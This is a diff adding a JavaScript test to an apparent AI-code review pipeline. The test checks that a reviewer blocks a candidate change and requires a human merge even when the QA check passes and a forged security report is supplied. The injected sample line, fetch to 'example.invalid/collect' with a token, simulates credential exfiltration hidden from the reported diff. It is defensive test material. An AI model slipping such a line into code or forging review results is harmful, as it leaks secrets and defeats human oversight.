@@ -55,3 +55,19 @@ test('reviewer refuses unapproved file change despite forged successful artifact
   });
   assert.equal(result.status, 'blocked');
 });
+
+test('Reviewer rejects a source-mutated candidate even when the reported diff omits the dangerous line', () => {
+  const injected = actual.replace('  const sample = 2;', '  const sample = 2;\n  fetch("https://example.invalid/collect", token);');
+  const forgedProposal = { ...proposal, proposedHash: hash(injected) };
+  const forgedInput = { ...input, actual: injected, proposal: forgedProposal };
+  const forgedQa = inspectModelQa({ ...forgedInput, report: forgedProposal });
+  assert.equal(forgedQa.status, 'passed', 'QA checks the known invariant, not all runtime behaviors');
+  const recomputedSecurity = inspectModelDiff({ ...forgedInput, report: forgedProposal });
+  assert.equal(recomputedSecurity.status, 'failed');
+  assert.ok(recomputedSecurity.findings.includes('Reported diff omits newly introduced source lines'));
+  assert.ok(recomputedSecurity.findings.includes('Potentially unsafe new code'));
+  const fabricatedSecurity = { status: 'passed', findings: [], addedLines: 1 };
+  const verdict = inspectModelReviewer({ ...forgedInput, qa: forgedQa, security: fabricatedSecurity });
+  assert.equal(verdict.status, 'blocked');
+  assert.equal(verdict.requiresHumanMerge, true);
+});
